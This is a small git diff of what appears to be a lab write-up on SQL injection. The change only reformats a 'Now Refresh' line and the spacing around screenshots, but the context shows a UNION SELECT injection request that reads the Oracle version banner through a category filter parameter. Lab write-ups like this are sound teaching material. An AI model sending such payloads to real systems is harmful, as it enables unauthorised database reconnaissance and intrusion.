@@ -69,8 +69,10 @@ something like:
 ```
 GET /filter?category=Lifestyle'+UNION+SELECT+BANNER,+NULL+FROM+v$version--$ HTTP/2
 ```
-Now Refresh
+
 
 <img width="1280" height="736" alt="Screenshot 2026-08-03 at 11 51 19 AM" src="https://github.com/user-attachments/assets/af3a688b-f12a-4960-89bc-b6348a96299c" />
+
+# Now Refresh
 
 <img width="1275" height="724" alt="Screenshot 2026-08-03 at 11 53 35 AM" src="https://github.com/user-attachments/assets/6fb96045-067c-4c81-9783-9e373e0e517e" />
